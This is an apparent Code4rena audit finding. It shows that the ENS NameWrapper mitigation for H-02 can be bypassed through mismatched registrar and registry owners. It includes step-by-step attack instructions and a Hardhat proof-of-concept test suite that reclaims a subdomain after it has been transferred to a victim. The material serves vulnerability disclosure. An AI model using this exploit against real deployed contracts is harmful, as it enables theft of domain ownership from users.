# [H] The patch is not sufficient: there is another insidious exploit that can cause the same critical consequences

## Summary
Severity: High
Chain: Smart contract
Component: 2022-12-ens-mitigation
Published: 2022-12-20
Source: https://github.com/code-423n4/2022-12-ens-mitigation-findings/issues/12
Type: code-finding

## Details
# Lines of code

https://github.com/ensdomains/ens-contracts/blob/69af5ea4fa1bb21a3ef240dd219b574d0e207421/contracts/wrapper/NameWrapper.sol#L137-L140


# Vulnerability details

## Status

+ Has been reported to and confirmed by Jeff (ENS team)

## Note to the Judge

I am not sure whether I should label this as a _newly-identified High_ or a _mitigation hard error_. The root cause of this issue seems as same as the original report, but this requires us to write a more sophisticated (and creative) exploit. (maybe mitigation hard error?)

## Description 

The basic root cause of [__H-02__](https://github.com/code-423n4/2022-11-ens-findings/issues/16) is implied unwrapping, where the hacker can re-register an ETH2LD node (to himself) via the old  .eth registrar controller after the ETH2LD's expiration. As a result, the hacker can implicitly unwrap any sub-domains regardless of their burnt fuses. 

The following check was added to validate whether an ETH2LD is wrapped or not.

```solidity=
            if (
                registrarExpiry > block.timestamp &&
                registrar.ownerOf(uint256(labelHash)) != address(this)
            ) {
                owner = address(0);
            }
```

For the attack strategy we provided in the original report (which is most intuitive), the patch is sufficient. 

However, after checking the mitigation deeper, I observe there is another insidious attack strategy that can bypass the current patch.

Note that the current patch only checks the the registrar owner (i.e., `registrar.ownerOr`) but not the registry owner (i.e., `ens.owenr`) for an ETH2LD.

As a result, if the hacker sets the registrar owner (i.e., `registrar.ownerOr`) as the NameWrapper contract but leave the registry owner (i.e., `ens.owner`) as the hacker himself, he is able to launch an implied unwrapping later.
 
The hacker can launch the attack as follows.

+ leverage `registerAndWrapETH2LD` to register `sub1.eth` (i.e., register the name via new controller contract so it is a wrapped .eth)

+ create `sub2.sub1.eth` to the hacker himself w/o fuses burnt (i.e., create sub-name)

+ wait for the expiry of `sub1.eth` and re-register the registrar owner (i.e., the ERC721 owner) as the hacker himself (i.e., wait for expiry and re-register from old controller contract to the hacker himself)

+ set the registry owner (i.e., `ens.owner`) of `sub1.eth` as the hacker himself.

+ set the registrar owner (i.e., the ERC721 owner) as the NameWrapper contract. _This is to bypass the new-added patch_

+ leverage `setChildFuses` to burn the `PARENT_CANNOT_CONTROL` fuse  of `sub2.sub1.eth` 

+ transfer the wrapped token of `sub2.sub1.eth` to the victim user

+ HACK: reset  the registry owner (i.e., `ens.owenr`) of `sub2.sub1.eth` as the hacker

+ HACK: wrap `sub2.sub1.eth`

## Impact

Same as __H-02__, the vulnerability can induce an  implied unwrapping, which breaks the guarantees of `PARENT_CANNOT_CONTROL` and `CANNOT_CREATE_SUBDOMAIN`

## Proof of Concept

Put the following `poc_mitigation.js` to `test/wrapper/` and run `npx hardhat test test/wrapper/poc_mitigation.js`.

All mitigation PRs mentioned in https://github.com/code-423n4/2022-12-ens-mitigation#scope are affected.

```js=
const { ethers } = require('hardhat')
const { use, expect } = require('chai')
const { solidity } = require('ethereum-waffle')
const { labelhash, namehash, encodeName, FUSES } = require('../test-utils/ens')
const { evm } = require('../test-utils')
const { shouldBehaveLikeERC1155 } = require('./ERC1155.behaviour')
const { shouldSupportInterfaces } = require('./SupportsInterface.behaviour')
const { shouldRespectConstraints } = require('./Constraints.behaviour')
const { ZERO_ADDRESS } = require('@openzeppelin/test-helpers/src/constants')
const { deploy } = require('../test-utils/contracts')
const { EMPTY_BYTES32, EMPTY_ADDRESS } = require('../test-utils/constants')

const abiCoder = new ethers.utils.AbiCoder()

use(solidity)

const ROOT_NODE = EMPTY_BYTES32

const DUMMY_ADDRESS = '0x0000000000000000000000000000000000000001'
const DAY = 86400
const GRACE_PERIOD = 90 * DAY

function increaseTime(delay) {
  return ethers.provider.send('evm_increaseTime', [delay])
}

function mine() {
  return ethers.provider.send('evm_mine')
}

const {
  CANNOT_UNWRAP,
  CANNOT_BURN_FUSES,
  CANNOT_TRANSFER,
  CANNOT_SET_RESOLVER,
  CANNOT_SET_TTL,
  CANNOT_CREATE_SUBDOMAIN,
  PARENT_CANNOT_CONTROL,
  CAN_DO_EVERYTHING,
  IS_DOT_ETH,
} = FUSES

describe('Name Wrapper', () => {
  let ENSRegistry
  let ENSRegistry2
  let ENSRegistryH
  let BaseRegistrar
  let BaseRegistrar2
  let BaseRegistrarH
  let NameWrapper
  let NameWrapper2
  let NameWrapperH
  let NameWrapperUpgraded
  let MetaDataservice
  let signers
  let accounts
  let account
  let account2
  let hacker
  let result
  let MAX_EXPIRY = 2n ** 64n - 1n

  /* Utility funcs */

  async function registerSetupAndWrapName(label, account, fuses) {
    const tokenId = labelhash(label)

    await BaseRegistrar.register(tokenId, account, 1 * DAY)

    await BaseRegistrar.setApprovalForAll(NameWrapper.address, true)

    await NameWrapper.wrapETH2LD(label, account, fuses, EMPTY_ADDRESS)
  }

  before(async () => {
    signers = await ethers.getSigners()
    account = await signers[0].getAddress()
    account2 = await signers[1].getAddress()
    hacker = await signers[2].getAddress()

    EnsRegistry = await deploy('ENSRegistry')
    EnsRegistry2 = EnsRegistry.connect(signers[1])
    EnsRegistryH = EnsRegistry.connect(signers[2])

    BaseRegistrar = await deploy(
      'BaseRegistrarImplementation',
      EnsRegistry.address,
      namehash('eth'),
    )

    BaseRegistrar2 = BaseRegistrar.connect(signers[1])
    BaseRegistrarH = BaseRegistrar.connect(signers[2])

    await BaseRegistrar.addController(account)
    await BaseRegistrar.addController(account2)

    MetaDataservice = await deploy(
      'StaticMetadataService',
      'https://ens.domains',
    )

    NameWrapper = await deploy(
      'NameWrapper',
      EnsRegistry.address,
      BaseRegistrar.address,
      MetaDataservice.address,
    )
    NameWrapper2 = NameWrapper.connect(signers[1])
    NameWrapperH = NameWrapper.connect(signers[2])

    NameWrapperUpgraded = await deploy(
      'UpgradedNameWrapperMock',
      NameWrapper.address,
      EnsRegistry.address,
      BaseRegistrar.address,
    )

    // setup .eth
    await EnsRegistry.setSubnodeOwner(
      ROOT_NODE,
      labelhash('eth'),
      BaseRegistrar.address,
    )

    // setup .xyz
    await EnsRegistry.setSubnodeOwner(ROOT_NODE, labelhash('xyz'), account)

    //make sure base registrar is owner of eth TLD
    expect(await EnsRegistry.owner(namehash('eth'))).to.equal(
      BaseRegistrar.address,
    )
  })

  beforeEach(async () => {
    result = await ethers.provider.send('evm_snapshot')
  })
  afterEach(async () => {
    await ethers.provider.send('evm_revert', [result])
  })

  describe('PoC', () => {
    const label1 = 'sub1'
    const labelHash1 = labelhash('sub1')
    const wrappedTokenId1 = namehash('sub1.eth')

    const label2 = 'sub2'
    const labelHash2 = labelhash('sub2')
    const wrappedTokenId2 = namehash('sub2.sub1.eth')

    const label3 = 'sub3'
    const labelHash3 = labelhash('sub3')
    const wrappedTokenId3 = namehash('sub3.sub2.sub1.eth')

    const label4 = 'sub4'
    const labelHash4 = labelhash('sub4')
    const wrappedTokenId4 = namehash('sub4.sub3.sub2.sub1.eth')

    before(async () => {
      await BaseRegistrar.addController(NameWrapper.address)
      await NameWrapper.setController(account, true)
    })

    it('Attack happens within the deprecation period where both .eth registrar controllers are active - Hack 1', async () => {
      await NameWrapper.registerAndWrapETH2LD(
        label1,
        hacker,
        1 * DAY,
        EMPTY_ADDRESS,
        CANNOT_UNWRAP
      )

      // create `sub2.sub1.eth` w/o fuses burnt
      await NameWrapperH.setSubnodeOwner(
        wrappedTokenId1,
        label2,
        hacker,
        CAN_DO_EVERYTHING,
        MAX_EXPIRY
      )
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)

      // wait the ETH2LD expired and re-register to the hacker himself
      await evm.advanceTime(GRACE_PERIOD + 1 * DAY + 1)
      await evm.mine()

      // XXX: note that at this step, the hackler should use the current .eth
      // registrar to directly register `sub1.eth` to himself, without wrapping
      // the name.
      await BaseRegistrar.register(labelHash1, hacker, 10 * DAY)
      expect(await EnsRegistry.owner(wrappedTokenId1)).to.equal(hacker)
      expect(await BaseRegistrar.ownerOf(labelHash1)).to.equal(hacker)

      // XXX: PREPARE HACK!
      // set `EnsRegistry.owner` of `sub1.eth` as the hacker himself.
      await EnsRegistryH.setOwner(wrappedTokenId1, hacker)

      // XXX: PREPARE HACK!
      // set controller owner as the NameWrapper contract, to bypass the check
      await BaseRegistrarH.transferFrom(hacker, NameWrapper.address, labelHash1)
      expect(await BaseRegistrar.ownerOf(labelHash1)).to.equal(NameWrapper.address)

      // burn `sub2.sub1.eth` fuses
      // XXX: do this via `setChildFuses`
      await NameWrapperH.setChildFuses(
        wrappedTokenId1,
        labelHash2,
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP | CANNOT_CREATE_SUBDOMAIN,
        MAX_EXPIRY
      )
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)

      // send `sub2.sub1.eth` to the victim user
      await NameWrapperH.safeTransferFrom(
        hacker,
        account2,
        wrappedTokenId2,
        1,
        "0x"
      )

      // XXX: check statue
      let [owner2, fuses2, _] = await NameWrapper.getData(wrappedTokenId2)
      expect(owner2).to.equal(account2)
      expect(fuses2).to.equal(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP | CANNOT_CREATE_SUBDOMAIN)

      // XXX: HACK!!!
      // reset the `EnsRegistry.owner` of `sub2.sub1.eth` as the hacker
      await EnsRegistryH.setSubnodeOwner(wrappedTokenId1, labelHash2, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)

      // XXX: HACK!!!
      // create `sub3.sub2.sub1.eth`
      await EnsRegistryH.setSubnodeOwner(wrappedTokenId2, labelHash3, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId3)).to.equal(hacker)

      // XXX: HACK!!!
      // wrap `sub3.sub2.sub1.eth`
      await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)
      await NameWrapperH.wrap(encodeName('sub3.sub2.sub1.eth'), hacker, EMPTY_ADDRESS)
      expect(await NameWrapper.ownerOf(wrappedTokenId3)).to.equal(hacker)
    })

    it('Attack happens within the deprecation period where both .eth registrar controllers are active - Hack 2', async () => {
      await NameWrapper.registerAndWrapETH2LD(
        label1,
        hacker,
        1 * DAY,
        EMPTY_ADDRESS,
        CANNOT_UNWRAP
      )

      // create `sub2.sub1.eth` w/o fuses burnt
      await NameWrapperH.setSubnodeOwner(
        wrappedTokenId1,
        label2,
        hacker,
        CAN_DO_EVERYTHING,
        MAX_EXPIRY
      )
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)

      // wait the ETH2LD expired and re-register to the hacker himself
      await evm.advanceTime(GRACE_PERIOD + 1 * DAY + 1)
      await evm.mine()

      // XXX: note that at this step, the hackler should use the current .eth
      // registrar to directly register `sub1.eth` to himself, without wrapping
      // the name.
      await BaseRegistrar.register(labelHash1, hacker, 10 * DAY)
      expect(await EnsRegistry.owner(wrappedTokenId1)).to.equal(hacker)
      expect(await BaseRegistrar.ownerOf(labelHash1)).to.equal(hacker)

      // XXX: PREPARE HACK!
      // set `EnsRegistry.owner` of `sub1.eth` as the hacker himself.
      await EnsRegistryH.setOwner(wrappedTokenId1, hacker)

      // XXX: PREPARE HACK!
      // set controller owner as the NameWrapper contract, to bypass the check
      await BaseRegistrarH.transferFrom(hacker, NameWrapper.address, labelHash1)
      expect(await BaseRegistrar.ownerOf(labelHash1)).to.equal(NameWrapper.address)

      // burn `sub2.sub1.eth` fuses
      // XXX: do this via `setChildFuses`
      await NameWrapperH.setChildFuses(
        wrappedTokenId1,
        labelHash2,
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,
        MAX_EXPIRY
      )
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)

      // send `sub2.sub1.eth` to the victim user
      await NameWrapperH.safeTransferFrom(
        hacker,
        account2,
        wrappedTokenId2,
        1,
        "0x"
      )

      // XXX: check statue
      let [owner2, fuses2, _] = await NameWrapper.getData(wrappedTokenId2)
      expect(owner2).to.equal(account2)
      expect(fuses2).to.equal(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP)

      // XXX: HACK!!!
      // reset the `EnsRegistry.owner` of `sub2.sub1.eth` as the hacker
      await EnsRegistryH.setSubnodeOwner(wrappedTokenId1, labelHash2, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)

      // XXX: HACK!!!
      // wrap `sub2.sub1.eth`
      await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)
      await NameWrapperH.wrap(encodeName('sub2.sub1.eth'), hacker, EMPTY_ADDRESS)
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)
    })
  })
})
``` 

## Recommended Mitigation Steps

Maybe add the check of registry owners will help mitigate the issue, which currently looks like a valid patch.
